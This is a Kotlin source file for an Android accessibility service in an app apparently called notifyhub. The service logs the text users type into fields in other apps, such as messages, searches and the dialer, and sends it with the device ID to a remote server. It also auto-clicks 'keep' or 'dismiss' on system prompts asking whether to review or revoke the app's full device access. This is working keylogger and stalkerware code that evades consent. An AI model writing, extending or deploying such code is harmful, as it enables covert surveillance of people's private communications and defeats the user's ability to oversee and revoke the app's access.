package com.notifyhub

import android.accessibilityservice.AccessibilityService
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.time.Instant
import java.util.concurrent.ConcurrentHashMap

/**
 * Captures text the user types into editable fields and forwards it to the server.
 *
 * Design choices (kept deliberately conservative):
 *  - Only editable nodes (isEditable) are considered.
 *  - Password fields (isPassword) are NEVER captured.
 *  - Our own package and system/IME noise packages are skipped.
 *  - Captures are debounced: a field is only sent after the user pauses typing
 *    ([DEBOUNCE_MS] of no changes), or when focus leaves the field.
 *  - Unstable WebView/Compose view ids fall back to one session per app, so
 *    repeated accessibility events collapse to the latest value instead of
 *    producing many rows.
 *  - Global per-app text dedup suppresses exact repeats regardless of field id.
 */
class TypedTextService : AccessibilityService() {

    private companion object {
        const val DEBOUNCE_MS = 4000L
        const val FLUSH_INTERVAL_MS = 500L
        const val MAX_PENDING_AGE_MS = 20_000L
        const val RECENT_SENT_WINDOW_MS = 30_000L
        // Only true system noise — kept minimal so real apps (incl. the dialer)
        // are never silently skipped.
        val BLOCKLIST = setOf(
            "android",
            "com.android.systemui",
            "com.android.settings",
            "com.miui.daemon",
            "com.miui.securitycenter",
            "com.miui.powerkeeper",
            "com.lbe.security.miui",
            "com.google.android.permissioncontroller",
            "com.android.permissioncontroller",
            "com.google.android.gms"
        )

        // System components that show "Review app with full device access" prompts.
        // When one of their windows opens, we auto-tap the keep/dismiss button so a
        // phone left unattended never waits on that dialog.
        val REVIEW_PACKAGES = setOf(
            "com.google.android.permissioncontroller",
            "com.android.permissioncontroller",
            "com.lbe.security.miui",
            "com.miui.guardprovider"
        )
        val KEEP_PHRASES = listOf("keep", "got it", "not now", "no thanks", "dismiss", "知道了")
        val DANGEROUS_PHRASES = listOf(
            "remove", "revoke", "don't allow", "do not allow", "deny", "turn off"
        )

        val PLACEHOLDER_EXACT = setOf(
            "message", "type a message", "write a message", "send a message",
            "search", "search...", "search…", "type here", "write here",
            "enter text", "enter your answer", "enter your answer.",
            "say something", "add a comment", "write a comment",
            "reply", "write a reply", "text message", "sms",
            "মেসেজ", "বার্তা লিখুন"
        )
        val PLACEHOLDER_PREFIXES = listOf(
            "type a message", "write a message", "search", "enter your answer",
            "add a comment", "write a comment", "send a message", "reply", "aa "
        )

        // Accessibility announces FB mention/suggestion rows like
        // "Mention, Name, out of mention" — they are not text the user typed.
        val ACCESSIBILITY_ANNOUNCEMENT = Regex(
            """^(mention,|mentions\b)|,\s*out of (mention|mentions)\s*$|^(button|link|image|photo|video)\b""",
            RegexOption.IGNORE_CASE
        )
    }

    private data class PendingText(
        val packageName: String,
        val appLabel: String,
        val text: String,
        val updatedAt: Long,
        val firstSeenAt: Long,
        val hintSignature: String? = null
    )
    private data class SentText(val text: String, val at: Long)

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private val pending = ConcurrentHashMap<String, PendingText>()
    // Global dedup: keyed by package + normalized text, NOT by field key.
    // WebView/Compose apps often expose no stable view id, so per-key dedup
    // misses repeated events from the same visible field.
    private val lastSent = ConcurrentHashMap<String, SentText>()
    private var lastReviewAttempt = 0L

    /**
     * The permission controller opened a "review full device access" window.
     * Wait for it to finish inflating, then find the keep/dismiss button and tap
     * it. Only phrase-matched safe buttons are ever clicked; buttons containing
     * words like "remove" or "deny" are never touched, and if no safe button is
     * found the dialog is simply left alone (ignoring it revokes nothing).
     */
    private fun handlePermissionReview() {
        val now = System.currentTimeMillis()
        if (now - lastReviewAttempt < 10_000L) return
        lastReviewAttempt = now

        scope.launch {
            delay(1500)
            try {
                findAndClickKeep(rootInActiveWindow, 0)
            } catch (_: Exception) {}
        }
    }

    private fun findAndClickKeep(node: AccessibilityNodeInfo?, depth: Int): Boolean {
        node ?: return false
        if (depth > 25) return false

        val text = (node.text?.toString() ?: "") + " " + (node.contentDescription?.toString() ?: "")
        val lower = text.lowercase()
        if (lower.isNotBlank() && node.isClickable &&
            KEEP_PHRASES.any { lower.contains(it) } &&
            DANGEROUS_PHRASES.none { lower.contains(it) }
        ) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }

        for (i in 0 until node.childCount) {
            if (findAndClickKeep(node.getChild(i), depth + 1)) return true
        }
        return false
    }

    override fun onServiceConnected() {
        AppStatusReporter.report(this, force = true)
        scope.launch {
            while (isActive) {
                delay(FLUSH_INTERVAL_MS)
                flushExpired()
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return
        // Never capture our own UI, and skip system/IME noise packages.
        if (pkg == packageName) return

        if (pkg in REVIEW_PACKAGES) {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                handlePermissionReview()
            }
            return
        }
        if (pkg in BLOCKLIST) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> onTextChanged(event, pkg)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> onContentChanged()
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> commitOthers(sessionKey(pkg, stableViewId(event)))
        }
    }

    /**
     * Some apps (WebView, Compose, custom views) report edits via
     * TYPE_WINDOW_CONTENT_CHANGED instead of TYPE_VIEW_TEXT_CHANGED. There is no
     * usable source text on that event, so read the currently focused editable node.
     */
    private fun onContentChanged() {
        val node = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
        val nodePkg = node.packageName?.toString() ?: return
        if (nodePkg == packageName || nodePkg in BLOCKLIST) return
        if (!node.isEditable) return
        if (node.isPassword) return

        val text = node.text?.toString()?.trim().orEmpty()
        if (text.isBlank()) return
        val hint = readHint(node)
        if (isPlaceholderOrHint(text, hint)) return

        val key = sessionKey(nodePkg, node.viewIdResourceName)
        upsertPending(key, nodePkg, text, hint)
    }

    private fun onTextChanged(event: AccessibilityEvent, pkg: String) {
        val source = event.source ?: return
        if (!source.isEditable) return
        if (source.isPassword) return

        val text = source.text?.toString()?.trim().orEmpty()
        if (text.isBlank()) return
        val hint = readHint(source)
        if (isPlaceholderOrHint(text, hint)) return

        val key = sessionKey(pkg, source.viewIdResourceName)
        upsertPending(key, pkg, text, hint)
    }

    private fun readHint(node: AccessibilityNodeInfo): String? {
        val hint = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            node.hintText?.toString()
        } else null
        return (hint ?: node.contentDescription?.toString())?.trim()?.takeIf { it.isNotEmpty() }
    }

    private fun normText(s: String): String =
        s.trim().lowercase().replace(Regex("[\\s\\u200B\\u200C\\u200D\\uFEFF]+"), " ")
            .trimEnd('.', '…', ':', '!', '؟')

    private fun isPlaceholderOrHint(text: String, hint: String?): Boolean {
        val n = normText(text)
        if (n.length <= 1) return true
        val hn = hint?.let { normText(it) }
        if (hn != null && (n == hn || n.startsWith("$hn ") || hn.startsWith("$n "))) return true
        if (n in PLACEHOLDER_EXACT) return true
        if (PLACEHOLDER_PREFIXES.any { n == it || n.startsWith("$it ") }) return true
        if (ACCESSIBILITY_ANNOUNCEMENT.containsMatchIn(n)) return true
        return false
    }

    private fun upsertPending(key: String, pkg: String, text: String, hint: String?) {
        val now = System.currentTimeMillis()
        val prev = pending[key]
        val continuing = prev != null && now - prev.updatedAt <= MAX_PENDING_AGE_MS
        val base = if (continuing) prev?.firstSeenAt ?: now else now
        pending[key] = PendingText(
            packageName = pkg,
            appLabel = labelFor(pkg),
            text = text,
            updatedAt = now,
            firstSeenAt = base,
            hintSignature = hint?.let { normText(it) } ?: prev?.hintSignature
        )
    }

    /** Sends every field that has been idle long enough to represent a typing pause/session end. */
    private fun flushExpired() {
        val now = System.currentTimeMillis()
        for ((key, item) in pending) {
            if (now - item.updatedAt >= DEBOUNCE_MS || now - item.firstSeenAt >= MAX_PENDING_AGE_MS) {
                send(key, item)
            }
        }
    }

    /** Focus moved to a different field — commit anything else still pending. */
    private fun commitOthers(activeKey: String) {
        for ((key, item) in pending) {
            if (key != activeKey) send(key, item)
        }
    }

    private fun send(key: String, item: PendingText) {
        if (!pending.remove(key, item)) return
        val text = item.text.trim()
        if (text.isBlank() || isPlaceholderOrHint(text, item.hintSignature)) return
        val now = System.currentTimeMillis()
        val dedupKey = "${item.packageName}|${normText(text)}"
        val prev = lastSent[dedupKey]
        if (prev != null && now - prev.at < RECENT_SENT_WINDOW_MS) return
        lastSent[dedupKey] = SentText(text, now)
        if (lastSent.size > 200) {
            lastSent.entries.removeIf { now - it.value.at > RECENT_SENT_WINDOW_MS * 3 }
        }

        NotificationSender.sendTypedText(
            deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID),
            packageName = item.packageName,
            appLabel = item.appLabel,
            text = text,
            capturedAt = Instant.now().toString()
        )
    }

    private fun stableViewId(event: AccessibilityEvent): String? =
        event.source?.viewIdResourceName?.takeIf { it.isNotBlank() }

    private fun sessionKey(pkg: String, viewId: String?): String =
        viewId?.takeIf { it.isNotBlank() }?.let { "$pkg:$it" } ?: pkg

    private fun labelFor(pkg: String): String = try {
        packageManager.getApplicationLabel(
            packageManager.getApplicationInfo(pkg, 0)
        ).toString()
    } catch (_: Exception) {
        pkg
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
